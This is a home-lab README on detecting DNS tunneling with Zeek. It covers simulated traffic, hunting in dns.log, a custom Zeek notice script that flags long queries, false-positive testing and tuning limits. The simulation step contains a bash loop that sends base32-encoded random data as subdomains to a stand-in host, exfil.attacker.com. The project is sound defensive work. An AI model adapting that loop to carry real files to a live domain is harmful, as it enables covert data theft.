# Detecting DNS Tunneling with Zeek

> Home SOC lab project: I simulated a DNS tunneling attack, hunted it in Zeek logs, and wrote a custom Zeek detection script that raises alerts automatically.

**Skills shown:** Network Security Monitoring (NSM) · Zeek scripting · threat hunting · detection engineering · log analysis

---

## 1. Why this matters

Most corporate firewalls allow DNS (UDP/53) outbound, because without it nothing works. Attackers abuse that trust: they hide stolen data or C2 commands **inside DNS queries** (e.g. `<encoded-data>.attacker-domain.com`). The firewall sees "just DNS" and lets it through.

An IDS signature rarely catches this, because each single query looks legitimate. What gives it away is **behaviour**: abnormally long, random-looking subdomains in high volume. That is exactly what an NSM tool like Zeek records.

**MITRE ATT&CK:** [T1071.004 – Application Layer Protocol: DNS](https://attack.mitre.org/techniques/T1071/004/) · [T1048 – Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048/)

---

## 2. Lab setup

| Role | Host | Notes |
|---|---|---|
| Sensor + "compromised host" | `soc-mgmt` (Ubuntu 24.04) | Zeek 9.0.1, tcpdump; also generates the tunneling queries |
| DNS server | Metasploitable2 `10.10.20.30` | BIND, receives the queries |
| Network | Isolated lab segment `10.10.20.0/24` | No traffic leaves the lab |

All testing was done on my own isolated lab machines.

---

## 3. Attack simulation

I simulated a compromised host leaking data: 15 DNS queries, each carrying 30 bytes of random "stolen data" encoded as **base32** in the subdomain. Real tunneling tools (iodine, dnscat2) encode their payloads the same way. Traffic was captured with tcpdump:

```bash
sudo timeout 15 tcpdump -i any -w tunnel.pcap 'port 53' &
sleep 2
for i in $(seq 1 15); do
  dig @10.10.20.30 $(head -c 30 /dev/urandom | base32 | tr -d '=' | tr 'A-Z' 'a-z').exfil.attacker.com +short
done
wait
```

- `head -c 30 /dev/urandom`: 30 random bytes stand in for stolen data
- `base32 | tr -d '='`: makes the bytes DNS-safe (letters and digits only, padding removed)
- `tr 'A-Z' 'a-z'`: lowercase, like real tools produce

30 bytes in base32 = 48 characters, plus `.exfil.attacker.com` = **67 characters per query**.

Example of what the queries looked like:

```
rph4apsw2vuhfcfyyoukumogzg6ujpvrl6bl7wc6ypapwjuy.exfil.attacker.com
mx6inwm46o4zzbsxoxv5aevvpjea4ypkno7pvezdhamtvioo.exfil.attacker.com
```

Each label is 48 random base32 characters, which is what encoded stolen data looks like on the wire.

---

## 4. Hunting in `dns.log`

Zeek writes every DNS request to `dns.log`. I extracted the queried names with `zeek-cut`:

```bash
cat dns.log | zeek-cut query | sort | uniq -c | sort -rn | head
```

Normal domains are short (`google.com`, `ubuntu.com`). So I sorted queries by **length**:

```bash
cat dns.log | zeek-cut query | awk '{ print length($0), $0 }' | sort -rn | head
```

**Finding:** the top of the list was made up entirely of **67-character** queries to `*.exfil.attacker.com`. The labels were random base32 strings, nothing like a human-readable domain. They stood out immediately.

Output (top 3 of 10):

```
67 rph4apsw2vuhfcfyyoukumogzg6ujpvrl6bl7wc6ypapwjuy.exfil.attacker.com
67 mx6inwm46o4zzbsxoxv5aevvpjea4ypkno7pvezdhamtvioo.exfil.attacker.com
67 lko6vda27x2wwuyvufql4wvkaciqjuen4a3neamkn5mshjee.exfil.attacker.com
```

---

## 5. Detection: custom Zeek script

Manual hunting does not scale, so I turned the finding into an automatic detection. The script raises a Zeek **NOTICE** when a DNS query is longer than 50 characters:

```zeek
# dns-tunnel-detect.zeek
@load base/frameworks/notice

redef enum Notice::Type += {
    DNS_Tunnel_Suspected,
};

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
{
    if ( |query| > 50 )
        NOTICE([$note=DNS_Tunnel_Suspected,
                $conn=c,
                $msg=fmt("Cox uzun DNS sorgusu (%d simvol) - tunneling subhesi", |query|),
                $sub=query]);
}
```

*(The alert message is in Azerbaijani: "Very long DNS query (N chars) – tunneling suspected".)*

Run against the capture:

```bash
zeek -r tunnel.pcap dns-tunnel-detect.zeek
```

Check the alerts:

```bash
cat notice.log | zeek-cut note msg sub
```

**Result:** **15 `DNS_Tunnel_Suspected` alerts** in `notice.log`, one per tunneling query (15/15 detected).

Output (first 3 of 15):

```
DNS_Tunnel_Suspected  Cox uzun DNS sorgusu (67 simvol) - tunneling subhesi  mx6inwm46o4zzbsxoxv5aevvpjea4ypkno7pvezdhamtvioo.exfil.attacker.com
DNS_Tunnel_Suspected  Cox uzun DNS sorgusu (67 simvol) - tunneling subhesi  cc4orlyavh4ki64fj6wmoajpaamsjr2u3xl4kb6kxhp3hvsg.exfil.attacker.com
DNS_Tunnel_Suspected  Cox uzun DNS sorgusu (67 simvol) - tunneling subhesi  g4xjnxjiskm3eglphotm65uks73rqsimx72kzsd34yld7eos.exfil.attacker.com
```

**False-positive check:** `tunnel.pcap` contains only the attack queries, so a clean result there proves nothing. I ran the same script against a separate capture of normal DNS traffic:

```bash
zeek -C -r traffic.pcap dns-tunnel-detect.zeek
```

**Result:** `dns.log` contained the normal queries (`localhost`, `metasploitable.localdomain`, `version.bind`), and **no `notice.log` was created**, so the script raised 0 alerts.

Three local queries is a small sample, so I also captured real internet lookups (`normal.pcap`) and checked their lengths:

```bash
cat dns.log | zeek-cut query | sort -u | awk '{ print length($0), $0 }'
```

| Query | Length |
|---|---|
| google.com / github.com / ubuntu.com | 10 |
| youtube.com | 11 |
| wikipedia.org | 13 |
| cloudflare.com | 14 |
| security.ubuntu.com | 19 |
| fonts.googleapis.com | 20 |
| login.microsoftonline.com | 25 |

**0 alerts on 12 normal queries.** The longest legitimate name (25 chars) is half the threshold, and the tunneling queries (67 chars) are well above it.

| | Normal | Tunneling |
|---|---|---|
| Max query length | 25 | 67 |
| Alerts | 0 / 12 | 15 / 15 |

> **Gotcha: checksum offloading.** Without `-C`, Zeek warned that the capture had invalid UDP checksums. The traffic was captured on the sending host, so tcpdump saw the packets *before* the NIC filled in the checksum. By default Zeek discards packets with bad checksums, so a "0 alerts" result could simply mean Zeek never analyzed the traffic. `-C` tells Zeek to ignore checksums.

To see whether the detection actually works, it has to be tested on normal traffic as well as the attack.

---

## 6. Limitations and tuning

- **False positives:** some legitimate services (CDNs, anti-virus cloud lookups, `_dmarc`/DKIM records) also use long names. In production I would add an **allowlist** of known domains.
- **Evasion:** an attacker can keep each query under 50 characters. Stronger detection adds more signals:
  - **Entropy**: random strings vs. readable words
  - **Volume**: many unique subdomains under one parent domain
  - **Record types**: unusual amounts of `TXT`/`NULL` queries
  - **Domain reputation**: newly registered domains
- One threshold is a starting point. In a real SOC it would be tuned against the environment's normal baseline.

---

## 7. What I learned

- Why DNS is a favourite covert channel, and why signature-based IDS often misses it.
- **"Suricata shouts, Zeek writes"**: an IDS alerts on known patterns, while NSM logs let you hunt for unknown ones.
- How to turn a manual hunt into a repeatable detection (hunt → hypothesis → rule).
- Every detection needs tuning: a threshold that works in a lab still needs a baseline in production.

---

## Repository structure

```
zeek-dns-tunneling/
├── README.md
└── scripts/dns-tunnel-detect.zeek
```
